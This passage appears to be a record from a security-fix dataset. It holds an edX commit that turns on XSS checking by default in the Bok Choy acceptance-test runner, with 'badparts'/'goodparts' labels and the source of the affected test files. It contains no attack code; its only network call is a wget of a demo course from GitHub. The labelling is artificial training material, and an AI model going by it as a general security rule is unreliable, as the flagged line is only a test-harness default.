b/pavelib/paver_tests/test_paver_bok_choy_cmds.py\nindex 0573565146..9f37700463 100644\n--- a/pavelib/paver_tests/test_paver_bok_choy_cmds.py\n+++ b/pavelib/paver_tests/test_paver_bok_choy_cmds.py\n@@ -18,7 +18,7 @@ class TestPaverBokChoyCmd(unittest.TestCase):\n     Paver Bok Choy Command test cases\n     \"\"\"\n \n-    def _expected_command(self, name, store=None, verify_xss=False):\n+    def _expected_command(self, name, store=None, verify_xss=True):\n         \"\"\"\n         Returns the command that is expected to be run for the given test spec\n         and store.\n@@ -101,11 +101,11 @@ def test_verify_xss(self):\n         self.assertEqual(suite.cmd, self._expected_command(name=name, verify_xss=True))\n \n     def test_verify_xss_env_var(self):\n-        self.env_var_override.set('VERIFY_XSS', 'True')\n+        self.env_var_override.set('VERIFY_XSS', 'False')\n         with self.env_var_override:\n             suite = BokChoyTestSuite('')\n             name = 'tests'\n-            self.assertEqual(suite.cmd, self._expected_command(name=name, verify_xss=True))\n+            self.assertEqual(suite.cmd, self._expected_command(name=name, verify_xss=False))\n \n     def test_test_dir(self):\n         test_dir = 'foo'\ndiff --git a/pavelib/utils/test/suites/bokchoy_suite.py b/pavelib/utils/test/suites/bokchoy_suite.py\nindex 19d51da7b5..327b6b9c3c 100644\n--- a/pavelib/utils/test/suites/bokchoy_suite.py\n+++ b/pavelib/utils/test/suites/bokchoy_suite.py\n@@ -58,7 +58,7 @@ def __init__(self, *args, **kwargs):\n         self.default_store = kwargs.get('default_store', None)\n         self.verbosity = kwargs.get('verbosity', DEFAULT_VERBOSITY)\n         self.num_processes = kwargs.get('num_processes', DEFAULT_NUM_PROCESSES)\n-        self.verify_xss = kwargs.get('verify_xss', os.environ.get('VERIFY_XSS', False))\n+        self.verify_xss = kwargs.get('verify_xss', os.environ.get('VERIFY_XSS', True))\n         self.extra_args = kwargs.get('extra_args', '')\n         self.har_dir = self.log_dir / 'hars'\n         self.a11y_file = Env.BOK_CHOY_A11Y_CUSTOM_RULES_FILE\n", "message": "", "files": {"/pavelib/paver_tests/test_paver_bok_choy_cmds.py": {"changes": [{"diff": "\n     Paver Bok Choy Command test cases\n     \"\"\"\n \n-    def _expected_command(self, name, store=None, verify_xss=False):\n+    def _expected_command(self, name, store=None, verify_xss=True):\n         \"\"\"\n         Returns the command that is expected to be run for the given test spec\n         and store.\n", "add": 1, "remove": 1, "filename": "/pavelib/paver_tests/test_paver_bok_choy_cmds.py", "badparts": ["    def _expected_command(self, name, store=None, verify_xss=False):"], "goodparts": ["    def _expected_command(self, name, store=None, verify_xss=True):"]}, {"diff": "\n         self.assertEqual(suite.cmd, self._expected_command(name=name, verify_xss=True))\n \n     def test_verify_xss_env_var(self):\n-        self.env_var_override.set('VERIFY_XSS', 'True')\n+        self.env_var_override.set('VERIFY_XSS', 'False')\n         with self.env_var_override:\n             suite = BokChoyTestSuite('')\n             name = 'tests'\n-            self.assertEqual(suite.cmd, self._expected_command(name=name, verify_xss=True))\n+            self.assertEqual(suite.cmd, self._expected_command(name=name, verify_xss=False))\n \n     def test_test_dir(self):\n         test_dir = 'foo'", "add": 2, "remove": 2, "filename": "/pavelib/paver_tests/test_paver_bok_choy_cmds.py", "badparts": ["        self.env_var_override.set('VERIFY_XSS', 'True')", "            self.assertEqual(suite.cmd, self._expected_command(name=name, verify_xss=True))"], "goodparts": ["        self.env_var_override.set('VERIFY_XSS', 'False')", "            self.assertEqual(suite.cmd, self._expected_command(name=name, verify_xss=False))"]}], "source": "\n\"\"\" Tests for the bok-choy paver commands themselves. Run just this test with: paver test_lib -t pavelib/paver_tests/test_paver_bok_choy_cmds.py \"\"\" import os import unittest from mock import patch, call from test.test_support import EnvironmentVarGuard from paver.easy import BuildFailure from pavelib.utils.test.suites import BokChoyTestSuite, Pa11yCrawler REPO_DIR=os.getcwd() class TestPaverBokChoyCmd(unittest.TestCase): \"\"\" Paver Bok Choy Command test cases \"\"\" def _expected_command(self, name, store=None, verify_xss=False): \"\"\" Returns the command that is expected to be run for the given test spec and store. \"\"\" expected_statement=( \"DEFAULT_STORE={default_store} \" \"SCREENSHOT_DIR='{repo_dir}/test_root/log{shard_str}' \" \"BOK_CHOY_HAR_DIR='{repo_dir}/test_root/log{shard_str}/hars' \" \"BOKCHOY_A11Y_CUSTOM_RULES_FILE='{repo_dir}/{a11y_custom_file}' \" \"SELENIUM_DRIVER_LOG_DIR='{repo_dir}/test_root/log{shard_str}' \" \"VERIFY_XSS='{verify_xss}' \" \"nosetests{repo_dir}/common/test/acceptance/{exp_text} \" \"--with-xunit \" \"--xunit-file={repo_dir}/reports/bok_choy{shard_str}/xunit.xml \" \"--verbosity=2 \" ).format( default_store=store, repo_dir=REPO_DIR, shard_str='/shard_' +self.shard if self.shard else '', exp_text=name, a11y_custom_file='node_modules/edx-custom-a11y-rules/lib/custom_a11y_rules.js', verify_xss=verify_xss ) return expected_statement def setUp(self): super(TestPaverBokChoyCmd, self).setUp() self.shard=os.environ.get('SHARD') self.env_var_override=EnvironmentVarGuard() def test_default(self): suite=BokChoyTestSuite('') name='tests' self.assertEqual(suite.cmd, self._expected_command(name=name)) def test_suite_spec(self): spec='test_foo.py' suite=BokChoyTestSuite('', test_spec=spec) name='tests/{}'.format(spec) self.assertEqual(suite.cmd, self._expected_command(name=name)) def test_class_spec(self): spec='test_foo.py:FooTest' suite=BokChoyTestSuite('', test_spec=spec) name='tests/{}'.format(spec) self.assertEqual(suite.cmd, self._expected_command(name=name)) def test_testcase_spec(self): spec='test_foo.py:FooTest.test_bar' suite=BokChoyTestSuite('', test_spec=spec) name='tests/{}'.format(spec) self.assertEqual(suite.cmd, self._expected_command(name=name)) def test_spec_with_draft_default_store(self): spec='test_foo.py' suite=BokChoyTestSuite('', test_spec=spec, default_store='draft') name='tests/{}'.format(spec) self.assertEqual( suite.cmd, self._expected_command(name=name, store='draft') ) def test_invalid_default_store(self): suite=BokChoyTestSuite('', default_store='invalid') name='tests' self.assertEqual( suite.cmd, self._expected_command(name=name, store='invalid') ) def test_serversonly(self): suite=BokChoyTestSuite('', serversonly=True) self.assertEqual(suite.cmd, \"\") def test_verify_xss(self): suite=BokChoyTestSuite('', verify_xss=True) name='tests' self.assertEqual(suite.cmd, self._expected_command(name=name, verify_xss=True)) def test_verify_xss_env_var(self): self.env_var_override.set('VERIFY_XSS', 'True') with self.env_var_override: suite=BokChoyTestSuite('') name='tests' self.assertEqual(suite.cmd, self._expected_command(name=name, verify_xss=True)) def test_test_dir(self): test_dir='foo' suite=BokChoyTestSuite('', test_dir=test_dir) self.assertEqual( suite.cmd, self._expected_command(name=test_dir) ) def test_verbosity_settings_1_process(self): \"\"\" Using 1 process means paver should ask for the traditional xunit plugin for plugin results \"\"\" expected_verbosity_string=( \"--with-xunit --xunit-file={repo_dir}/reports/bok_choy{shard_str}/xunit.xml --verbosity=2\".format( repo_dir=REPO_DIR, shard_str='/shard_' +self.shard if self.shard else '' ) ) suite=BokChoyTestSuite('', num_processes=1) self.assertEqual(BokChoyTestSuite.verbosity_processes_string(suite), expected_verbosity_string) def test_verbosity_settings_2_processes(self): \"\"\" Using multiple processes means specific xunit, coloring, and process-related settings should be used. \"\"\" process_count=2 expected_verbosity_string=( \"--with-xunitmp --xunitmp-file={repo_dir}/reports/bok_choy{shard_str}/xunit.xml\" \" --processes={procs} --no-color --process-timeout=1200\".format( repo_dir=REPO_DIR, shard_str='/shard_' +self.shard if self.shard else '', procs=process_count ) ) suite=BokChoyTestSuite('', num_processes=process_count) self.assertEqual(BokChoyTestSuite.verbosity_processes_string(suite), expected_verbosity_string) def test_verbosity_settings_3_processes(self): \"\"\" With the above test, validate that num_processes can be set to various values \"\"\" process_count=3 expected_verbosity_string=( \"--with-xunitmp --xunitmp-file={repo_dir}/reports/bok_choy{shard_str}/xunit.xml\" \" --processes={procs} --no-color --process-timeout=1200\".format( repo_dir=REPO_DIR, shard_str='/shard_' +self.shard if self.shard else '', procs=process_count ) ) suite=BokChoyTestSuite('', num_processes=process_count) self.assertEqual(BokChoyTestSuite.verbosity_processes_string(suite), expected_verbosity_string) def test_invalid_verbosity_and_processes(self): \"\"\" If an invalid combination of verbosity and number of processors is passed in, a BuildFailure should be raised \"\"\" suite=BokChoyTestSuite('', num_processes=2, verbosity=3) with self.assertRaises(BuildFailure): BokChoyTestSuite.verbosity_processes_string(suite) class TestPaverPa11yCrawlerCmd(unittest.TestCase): \"\"\" Paver pa11ycrawler command test cases. Most of the functionality is inherited from BokChoyTestSuite, so those tests aren't duplicated. \"\"\" def setUp(self): super(TestPaverPa11yCrawlerCmd, self).setUp() mock_sh=patch('pavelib.utils.test.suites.bokchoy_suite.sh') self._mock_sh=mock_sh.start() self.addCleanup(mock_sh.stop) def _expected_command(self, report_dir, start_urls): \"\"\" Returns the expected command to run pa11ycrawler. \"\"\" expected_statement=( 'pa11ycrawler run{start_urls} ' '--pa11ycrawler-allowed-domains=localhost ' '--pa11ycrawler-reports-dir={report_dir} ' '--pa11ycrawler-deny-url-matcher=logout ' '--pa11y-reporter=\"1.0-json\" ' '--depth-limit=6 ' ).format( start_urls=' '.join(start_urls), report_dir=report_dir, ) return expected_statement def test_default(self): suite=Pa11yCrawler('') self.assertEqual( suite.cmd, self._expected_command(suite.pa11y_report_dir, suite.start_urls) ) def test_get_test_course(self): suite=Pa11yCrawler('') suite.get_test_course() self._mock_sh.assert_has_calls([ call( 'wget{targz} -O{dir}demo_course.tar.gz'.format(targz=suite.tar_gz_file, dir=suite.imports_dir)), call( 'tar zxf{dir}demo_course.tar.gz -C{dir}'.format(dir=suite.imports_dir)), ]) def test_generate_html_reports(self): suite=Pa11yCrawler('') suite.generate_html_reports() self._mock_sh.assert_has_calls([ call( 'pa11ycrawler json-to-html --pa11ycrawler-reports-dir={}'.format(suite.pa11y_report_dir)), ]) ", "sourceWithComments": "\"\"\"\nTests for the bok-choy paver commands themselves.\nRun just this test with: paver test_lib -t pavelib/paver_tests/test_paver_bok_choy_cmds.py\n\"\"\"\nimport os\nimport unittest\n\nfrom mock import patch, call\nfrom test.test_support import EnvironmentVarGuard\nfrom paver.easy import BuildFailure\nfrom pavelib.utils.test.suites import BokChoyTestSuite, Pa11yCrawler\n\nREPO_DIR = os.getcwd()\n\n\nclass TestPaverBokChoyCmd(unittest.TestCase):\n    \"\"\"\n    Paver Bok Choy Command test cases\n    \"\"\"\n\n    def _expected_command(self, name, store=None, verify_xss=False):\n        \"\"\"\n        Returns the command that is expected to be run for the given test spec\n        and store.\n        \"\"\"\n\n        expected_statement = (\n            \"DEFAULT_STORE={default_store} \"\n            \"SCREENSHOT_DIR='{repo_dir}/test_root/log{shard_str}' \"\n            \"BOK_CHOY_HAR_DIR='{repo_dir}/test_root/log{shard_str}/hars' \"\n            \"BOKCHOY_A11Y_CUSTOM_RULES_FILE='{repo_dir}/{a11y_custom_file}' \"\n            \"SELENIUM_DRIVER_LOG_DIR='{repo_dir}/test_root/log{shard_str}' \"\n            \"VERIFY_XSS='{verify_xss}' \"\n            \"nosetests {repo_dir}/common/test/acceptance/{exp_text} \"\n            \"--with-xunit \"\n            \"--xunit-file={repo_dir}/reports/bok_choy{shard_str}/xunit.xml \"\n            \"--verbosity=2 \"\n        ).format(\n            default_store=store,\n            repo_dir=REPO_DIR,\n            shard_str='/shard_' + self.shard if self.shard else '',\n            exp_text=name,\n            a11y_custom_file='node_modules/edx-custom-a11y-rules/lib/custom_a11y_rules.js',\n            verify_xss=verify_xss\n        )\n        return expected_statement\n\n    def setUp(self):\n        super(TestPaverBokChoyCmd, self).setUp()\n        self.shard = os.environ.get('SHARD')\n        self.env_var_override = EnvironmentVarGuard()\n\n    def test_default(self):\n        suite = BokChoyTestSuite('')\n        name = 'tests'\n        self.assertEqual(suite.cmd, self._expected_command(name=name))\n\n    def test_suite_spec(self):\n        spec = 'test_foo.py'\n        suite = BokChoyTestSuite('', test_spec=spec)\n        name = 'tests/{}'.format(spec)\n        self.assertEqual(suite.cmd, self._expected_command(name=name))\n\n    def test_class_spec(self):\n        spec = 'test_foo.py:FooTest'\n        suite = BokChoyTestSuite('', test_spec=spec)\n        name = 'tests/{}'.format(spec)\n        self.assertEqual(suite.cmd, self._expected_command(name=name))\n\n    def test_testcase_spec(self):\n        spec = 'test_foo.py:FooTest.test_bar'\n        suite = BokChoyTestSuite('', test_spec=spec)\n        name = 'tests/{}'.format(spec)\n        self.assertEqual(suite.cmd, self._expected_command(name=name))\n\n    def test_spec_with_draft_default_store(self):\n        spec = 'test_foo.py'\n        suite = BokChoyTestSuite('', test_spec=spec, default_store='draft')\n        name = 'tests/{}'.format(spec)\n        self.assertEqual(\n            suite.cmd,\n            self._expected_command(name=name, store='draft')\n        )\n\n    def test_invalid_default_store(self):\n        # the cmd will dumbly compose whatever we pass in for the default_store\n        suite = BokChoyTestSuite('', default_store='invalid')\n        name = 'tests'\n        self.assertEqual(\n            suite.cmd,\n            self._expected_command(name=name, store='invalid')\n        )\n\n    def test_serversonly(self):\n        suite = BokChoyTestSuite('', serversonly=True)\n        self.assertEqual(suite.cmd, \"\")\n\n    def test_verify_xss(self):\n        suite = BokChoyTestSuite('', verify_xss=True)\n        name = 'tests'\n        self.assertEqual(suite.cmd, self._expected_command(name=name, verify_xss=True))\n\n    def test_verify_xss_env_var(self):\n        self.env_var_override.set('VERIFY_XSS', 'True')\n        with self.env_var_override:\n            suite = BokChoyTestSuite('')\n            name = 'tests'\n            self.assertEqual(suite.cmd, self._expected_command(name=name, verify_xss=True))\n\n    def test_test_dir(self):\n        test_dir = 'foo'\n        suite = BokChoyTestSuite('', test_dir=test_dir)\n        self.assertEqual(\n            suite.cmd,\n            self._expected_command(name=test_dir)\n        )\n\n    def test_verbosity_settings_1_process(self):\n        \"\"\"\n        Using 1 process means paver should ask for the traditional xunit plugin for plugin results\n        \"\"\"\n        expected_verbosity_string = (\n            \"--with-xunit --xunit-file={repo_dir}/reports/bok_choy{shard_str}/xunit.xml --verbosity=2\".format(\n                repo_dir=REPO_DIR,\n                shard_str='/shard_' + self.shard if self.shard else ''\n            )\n        )\n        suite = BokChoyTestSuite('', num_processes=1)\n        self.assertEqual(BokChoyTestSuite.verbosity_processes_string(suite), expected_verbosity_string)\n\n    def test_verbosity_settings_2_processes(self):\n        \"\"\"\n        Using multiple processes means specific xunit, coloring, and process-related settings should\n        be used.\n        \"\"\"\n        process_count = 2\n        expected_verbosity_string = (\n            \"--with-xunitmp --xunitmp-file={repo_dir}/reports/bok_choy{shard_str}/xunit.xml\"\n            \" --processes={procs} --no-color --process-timeout=1200\".format(\n                repo_dir=REPO_DIR,\n                shard_str='/shard_' + self.shard if self.shard else '',\n                procs=process_count\n            )\n        )\n        suite = BokChoyTestSuite('', num_processes=process_count)\n        self.assertEqual(BokChoyTestSuite.verbosity_processes_string(suite), expected_verbosity_string)\n\n    def test_verbosity_settings_3_processes(self):\n        \"\"\"\n        With the above test, validate that num_processes can be set to various values\n        \"\"\"\n        process_count = 3\n        expected_verbosity_string = (\n            \"--with-xunitmp --xunitmp-file={repo_dir}/reports/bok_choy{shard_str}/xunit.xml\"\n            \" --processes={procs} --no-color --process-timeout=1200\".format(\n                repo_dir=REPO_DIR,\n                shard_str='/shard_' + self.shard if self.shard else '',\n                procs=process_count\n            )\n        )\n        suite = BokChoyTestSuite('', num_processes=process_count)\n        self.assertEqual(BokChoyTestSuite.verbosity_processes_string(suite), expected_verbosity_string)\n\n    def test_invalid_verbosity_and_processes(self):\n        \"\"\"\n        If an invalid combination of verbosity and number of processors is passed in, a\n        BuildFailure should be raised\n        \"\"\"\n        suite = BokChoyTestSuite('', num_processes=2, verbosity=3)\n        with self.assertRaises(BuildFailure):\n            BokChoyTestSuite.verbosity_processes_string(suite)\n\n\nclass TestPaverPa11yCrawlerCmd(unittest.TestCase):\n\n    \"\"\"\n    Paver pa11ycrawler command test cases.  Most of the functionality is\n    inherited from BokChoyTestSuite, so those tests aren't duplicated.\n    \"\"\"\n\n    def setUp(self):\n        super(TestPaverPa11yCrawlerCmd, self).setUp()\n\n        # Mock shell commands\n        mock_sh = patch('pavelib.utils.test.suites.bokchoy_suite.sh')\n        self._mock_sh = mock_sh.start()\n\n        # Cleanup mocks\n        self.addCleanup(mock_sh.stop)\n\n    def _expected_command(self, report_dir, start_urls):\n        \"\"\"\n        Returns the expected command to run pa11ycrawler.\n        \"\"\"\n        expected_statement = (\n            'pa11ycrawler run {start_urls} '\n            '--pa11ycrawler-allowed-domains=localhost '\n            '--pa11ycrawler-reports-dir={report_dir} '\n            '--pa11ycrawler-deny-url-matcher=logout '\n            '--pa11y-reporter=\"1.0-json\" '\n            '--depth-limit=6 '\n        ).format(\n            start_urls=' '.join(start_urls),\n            report_dir=report_dir,\n        )\n        return expected_statement\n\n    def test_default(self):\n        suite = Pa11yCrawler('')\n        self.assertEqual(\n            suite.cmd,\n            self._expected_command(suite.pa11y_report_dir, suite.start_urls)\n        )\n\n    def test_get_test_course(self):\n        suite = Pa11yCrawler('')\n        suite.get_test_course()\n        self._mock_sh.assert_has_calls([\n            call(\n                'wget {targz} -O {dir}demo_course.tar.gz'.format(targz=suite.tar_gz_file, dir=suite.imports_dir)),\n            call(\n                'tar zxf {dir}demo_course.tar.gz -C {dir}'.format(dir=suite.imports_dir)),\n        ])\n\n    def test_generate_html_reports(self):\n        suite = Pa11yCrawler('')\n        suite.generate_html_reports()\n        self._mock_sh.assert_has_calls([\n            call(\n                'pa11ycrawler json-to-html --pa11ycrawler-reports-dir={}'.format(suite.pa11y_report_dir)),\n        ])\n"}, "/pavelib/utils/test/suites/bokchoy_suite.py": {"changes": [{"diff": "\n         self.default_store = kwargs.get('default_store', None)\n         self.verbosity = kwargs.get('verbosity', DEFAULT_VERBOSITY)\n         self.num_processes = kwargs.get('num_processes', DEFAULT_NUM_PROCESSES)\n-        self.verify_xss = kwargs.get('verify_xss', os.environ.get('VERIFY_XSS', False))\n+        self.verify_xss = kwargs.get('verify_xss', os.environ.get('VERIFY_XSS', True))\n         self.extra_args = kwargs.get('extra_args', '')\n         self.har_dir = self.log_dir / 'hars'\n         self.a11y_file = Env.BOK_CHOY_A11Y_CUSTOM_RULES_FILE\n", "add": 1, "remove": 1, "filename": "/pavelib/utils/test/suites/bokchoy_suite.py", "badparts": ["        self.verify_xss = kwargs.get('verify_xss', os.environ.get('VERIFY_XSS', False))"], "goodparts": ["        self.verify_xss = kwargs.get('verify_xss', os.environ.get('VERIFY_XSS', True))"]}], "source": "\n\"\"\" Class used for defining and running Bok Choy acceptance test suite \"\"\" from time import sleep from urllib import urlencode from common.test.acceptance.fixtures.course import CourseFixture, FixtureError from path import Path as path from paver.easy import sh, BuildFailure from pavelib.utils.test.suites.suite import TestSuite from pavelib.utils.envs import Env from pavelib.utils.test import bokchoy_utils from pavelib.utils.test import utils as test_utils import os try: from pygments.console import colorize except ImportError: colorize=lambda color, text: text __test__=False DEFAULT_NUM_PROCESSES=1 DEFAULT_VERBOSITY=2 class BokChoyTestSuite(TestSuite): \"\"\" TestSuite for running Bok Choy tests Properties(below is a subset): test_dir -parent directory for tests log_dir -directory for test output report_dir -directory for reports(e.g., coverage) related to test execution xunit_report -directory for xunit-style output(xml) fasttest -when set, skip various set-up tasks(e.g., collectstatic) serversonly -prepare and run the necessary servers, only stopping when interrupted with Ctrl-C testsonly -assume servers are running(as per above) and run tests with no setup or cleaning of environment test_spec -when set, specifies test files, classes, cases, etc. See platform doc. default_store -modulestore to use when running tests(split or draft) num_processes -number of processes or threads to use in tests. Recommendation is that this is less than or equal to the number of available processors. verify_xss -when set, check for XSS vulnerabilities in the page HTML. See nosetest documentation: http://nose.readthedocs.org/en/latest/usage.html \"\"\" def __init__(self, *args, **kwargs): super(BokChoyTestSuite, self).__init__(*args, **kwargs) self.test_dir=Env.BOK_CHOY_DIR / kwargs.get('test_dir', 'tests') self.log_dir=Env.BOK_CHOY_LOG_DIR self.report_dir=kwargs.get('report_dir', Env.BOK_CHOY_REPORT_DIR) self.xunit_report=self.report_dir / \"xunit.xml\" self.cache=Env.BOK_CHOY_CACHE self.fasttest=kwargs.get('fasttest', False) self.serversonly=kwargs.get('serversonly', False) self.testsonly=kwargs.get('testsonly', False) self.test_spec=kwargs.get('test_spec', None) self.default_store=kwargs.get('default_store', None) self.verbosity=kwargs.get('verbosity', DEFAULT_VERBOSITY) self.num_processes=kwargs.get('num_processes', DEFAULT_NUM_PROCESSES) self.verify_xss=kwargs.get('verify_xss', os.environ.get('VERIFY_XSS', False)) self.extra_args=kwargs.get('extra_args', '') self.har_dir=self.log_dir / 'hars' self.a11y_file=Env.BOK_CHOY_A11Y_CUSTOM_RULES_FILE self.imports_dir=kwargs.get('imports_dir', None) self.coveragerc=kwargs.get('coveragerc', None) self.save_screenshots=kwargs.get('save_screenshots', False) def __enter__(self): super(BokChoyTestSuite, self).__enter__() self.log_dir.makedirs_p() self.har_dir.makedirs_p() self.report_dir.makedirs_p() test_utils.clean_reports_dir() if not(self.fasttest or self.skip_clean or self.testsonly): test_utils.clean_test_files() msg=colorize('green', \"Checking for mongo, memchache, and mysql...\") print msg bokchoy_utils.check_services() if not self.testsonly: self.prepare_bokchoy_run() else: self.load_data() msg=colorize('green', \"Confirming servers have started...\") print msg bokchoy_utils.wait_for_test_servers() try: CourseFixture('foobar_org', '1117', 'seed_forum', 'seed_foo').install() print 'Forums permissions/roles data has been seeded' except FixtureError: pass if self.serversonly: self.run_servers_continuously() def __exit__(self, exc_type, exc_value, traceback): super(BokChoyTestSuite, self).__exit__(exc_type, exc_value, traceback) if self.testsonly: msg=colorize('green', 'Running in testsonly mode... SKIPPING database cleanup.') print msg else: msg=colorize('green', \"Cleaning up databases...\") print msg sh(\"./manage.py lms --settings bok_choy flush --traceback --noinput\") bokchoy_utils.clear_mongo() def verbosity_processes_string(self): \"\"\" Multiprocessing, xunit, color, and verbosity do not work well together. We need to construct the proper combination for use with nosetests. \"\"\" substring=[] if self.verbosity !=DEFAULT_VERBOSITY and self.num_processes !=DEFAULT_NUM_PROCESSES: msg='Cannot pass in both num_processors and verbosity. Quitting' raise BuildFailure(msg) if self.num_processes !=1: substring=[ \"--with-xunitmp --xunitmp-file={}\".format(self.xunit_report), \"--processes={}\".format(self.num_processes), \"--no-color --process-timeout=1200\" ] else: substring=[ \"--with-xunit\", \"--xunit-file={}\".format(self.xunit_report), \"--verbosity={}\".format(self.verbosity), ] return \" \".join(substring) def prepare_bokchoy_run(self): \"\"\" Sets up and starts servers for a Bok Choy run. If --fasttest is not specified then static assets are collected \"\"\" sh(\"{}/scripts/reset-test-db.sh\".format(Env.REPO_ROOT)) if not self.fasttest: self.generate_optimized_static_assets() bokchoy_utils.clear_mongo() self.cache.flush_all() self.load_data() self.load_courses() msg=colorize('green', \"Confirming servers are running...\") print msg bokchoy_utils.start_servers(self.default_store, self.coveragerc) def load_courses(self): \"\"\" Loads courses from self.imports_dir. Note: self.imports_dir is the directory that contains the directories that have courses in them. For example, if the course is located in `test_root/courses/test-example-course/`, self.imports_dir should be `test_root/courses/`. \"\"\" msg=colorize('green', \"Importing courses from{}...\".format(self.imports_dir)) print msg if self.imports_dir: sh( \"DEFAULT_STORE={default_store}\" \"./manage.py cms --settings=bok_choy import{import_dir}\".format( default_store=self.default_store, import_dir=self.imports_dir ) ) def load_data(self): \"\"\" Loads data into database from db_fixtures \"\"\" print 'Loading data from json fixtures in db_fixtures directory' sh( \"DEFAULT_STORE={default_store}\" \"./manage.py lms --settings bok_choy loaddata --traceback\" \" common/test/db_fixtures/*.json\".format( default_store=self.default_store, ) ) def run_servers_continuously(self): \"\"\" Infinite loop. Servers will continue to run in the current session unless interrupted. \"\"\" print 'Bok-choy servers running. Press Ctrl-C to exit...\\n' print 'Note: pressing Ctrl-C multiple times can corrupt noseid files and system state. Just press it once.\\n' while True: try: sleep(10000) except KeyboardInterrupt: print \"Stopping bok-choy servers.\\n\" break @property def cmd(self): \"\"\" This method composes the nosetests command to send to the terminal. If nosetests aren't being run, the command returns an empty string. \"\"\" if not self.test_spec: test_spec=self.test_dir else: test_spec=self.test_dir / self.test_spec if self.serversonly: return \"\" cmd=[ \"DEFAULT_STORE={}\".format(self.default_store), \"SCREENSHOT_DIR='{}'\".format(self.log_dir), \"BOK_CHOY_HAR_DIR='{}'\".format(self.har_dir), \"BOKCHOY_A11Y_CUSTOM_RULES_FILE='{}'\".format(self.a11y_file), \"SELENIUM_DRIVER_LOG_DIR='{}'\".format(self.log_dir), \"VERIFY_XSS='{}'\".format(self.verify_xss), \"nosetests\", test_spec, \"{}\".format(self.verbosity_processes_string()) ] if self.pdb: cmd.append(\"--pdb\") if self.save_screenshots: cmd.append(\"--with-save-baseline\") cmd.append(self.extra_args) cmd=(\" \").join(cmd) return cmd class Pa11yCrawler(BokChoyTestSuite): \"\"\" Sets up test environment with mega-course loaded, and runs pa11ycralwer against it. \"\"\" def __init__(self, *args, **kwargs): super(Pa11yCrawler, self).__init__(*args, **kwargs) self.course_key=kwargs.get('course_key') if self.imports_dir: self.should_fetch_course=False else: self.should_fetch_course=kwargs.get('should_fetch_course') self.imports_dir=path('test_root/courses/') self.pa11y_report_dir=os.path.join(self.report_dir, 'pa11ycrawler_reports') self.tar_gz_file=\"https://github.com/edx/demo-test-course/archive/master.tar.gz\" self.start_urls=[] auto_auth_params={ \"redirect\": 'true', \"staff\": 'true', \"course_id\": self.course_key, } cms_params=urlencode(auto_auth_params) self.start_urls.append(\"\\\"http://localhost:8031/auto_auth?{}\\\"\".format(cms_params)) sequence_url=\"/api/courses/v1/blocks/?{}\".format( urlencode({ \"course_id\": self.course_key, \"depth\": \"all\", \"all_blocks\": \"true\", }) ) auto_auth_params.update({'redirect_to': sequence_url}) lms_params=urlencode(auto_auth_params) self.start_urls.append(\"\\\"http://localhost:8003/auto_auth?{}\\\"\".format(lms_params)) def __enter__(self): if self.should_fetch_course: self.get_test_course() super(Pa11yCrawler, self).__enter__() def get_test_course(self): \"\"\" Fetches the test course. \"\"\" self.imports_dir.makedirs_p() zipped_course=self.imports_dir +'demo_course.tar.gz' msg=colorize('green', \"Fetching the test course from github...\") print msg sh( 'wget{tar_gz_file} -O{zipped_course}'.format( tar_gz_file=self.tar_gz_file, zipped_course=zipped_course, ) ) msg=colorize('green', \"Uncompressing the test course...\") print msg sh( 'tar zxf{zipped_course} -C{courses_dir}'.format( zipped_course=zipped_course, courses_dir=self.imports_dir, ) ) def generate_html_reports(self): \"\"\" Runs pa11ycrawler json-to-html \"\"\" cmd_str=( 'pa11ycrawler json-to-html --pa11ycrawler-reports-dir={report_dir}' ).format(report_dir=self.pa11y_report_dir) sh(cmd_str) @property def cmd(self): \"\"\" Runs pa11ycrawler as staff user against the test course. \"\"\" cmd_str=( 'pa11ycrawler run{start_urls} ' '--pa11ycrawler-allowed-domains={allowed_domains} ' '--pa11ycrawler-reports-dir={report_dir} ' '--pa11ycrawler-deny-url-matcher={dont_go_here} ' '--pa11y-reporter=\"{reporter}\" ' '--depth-limit={depth} ' ).format( start_urls=' '.join(self.start_urls), allowed_domains='localhost', report_dir=self.pa11y_report_dir, reporter=\"1.0-json\", dont_go_here=\"logout\", depth=\"6\", ) return cmd_str ", "sourceWithComments": "\"\"\"\nClass used for defining and running Bok Choy acceptance test suite\n\"\"\"\nfrom time import sleep\nfrom urllib import urlencode\n\nfrom common.test.acceptance.fixtures.course import CourseFixture, FixtureError\n\nfrom path import Path as path\nfrom paver.easy import sh, BuildFailure\nfrom pavelib.utils.test.suites.suite import TestSuite\nfrom pavelib.utils.envs import Env\nfrom pavelib.utils.test import bokchoy_utils\nfrom pavelib.utils.test import utils as test_utils\n\nimport os\n\ntry:\n    from pygments.console import colorize\nexcept ImportError:\n    colorize = lambda color, text: text\n\n__test__ = False  # do not collect\n\nDEFAULT_NUM_PROCESSES = 1\nDEFAULT_VERBOSITY = 2\n\n\nclass BokChoyTestSuite(TestSuite):\n    \"\"\"\n    TestSuite for running Bok Choy tests\n    Properties (below is a subset):\n      test_dir - parent directory for tests\n      log_dir - directory for test output\n      report_dir - directory for reports (e.g., coverage) related to test execution\n      xunit_report - directory for xunit-style output (xml)\n      fasttest - when set, skip various set-up tasks (e.g., collectstatic)\n      serversonly - prepare and run the necessary servers, only stopping when interrupted with Ctrl-C\n      testsonly - assume servers are running (as per above) and run tests with no setup or cleaning of environment\n      test_spec - when set, specifies test files, classes, cases, etc. See platform doc.\n      default_store - modulestore to use when running tests (split or draft)\n      num_processes - number of processes or threads to use in tests. Recommendation is that this\n      is less than or equal to the number of available processors.\n      verify_xss - when set, check for XSS vulnerabilities in the page HTML.\n      See nosetest documentation: http://nose.readthedocs.org/en/latest/usage.html\n    \"\"\"\n    def __init__(self, *args, **kwargs):\n        super(BokChoyTestSuite, self).__init__(*args, **kwargs)\n        self.test_dir = Env.BOK_CHOY_DIR / kwargs.get('test_dir', 'tests')\n        self.log_dir = Env.BOK_CHOY_LOG_DIR\n        self.report_dir = kwargs.get('report_dir', Env.BOK_CHOY_REPORT_DIR)\n        self.xunit_report = self.report_dir / \"xunit.xml\"\n        self.cache = Env.BOK_CHOY_CACHE\n        self.fasttest = kwargs.get('fasttest', False)\n        self.serversonly = kwargs.get('serversonly', False)\n        self.testsonly = kwargs.get('testsonly', False)\n        self.test_spec = kwargs.get('test_spec', None)\n        self.default_store = kwargs.get('default_store', None)\n        self.verbosity = kwargs.get('verbosity', DEFAULT_VERBOSITY)\n        self.num_processes = kwargs.get('num_processes', DEFAULT_NUM_PROCESSES)\n        self.verify_xss = kwargs.get('verify_xss', os.environ.get('VERIFY_XSS', False))\n        self.extra_args = kwargs.get('extra_args', '')\n        self.har_dir = self.log_dir / 'hars'\n        self.a11y_file = 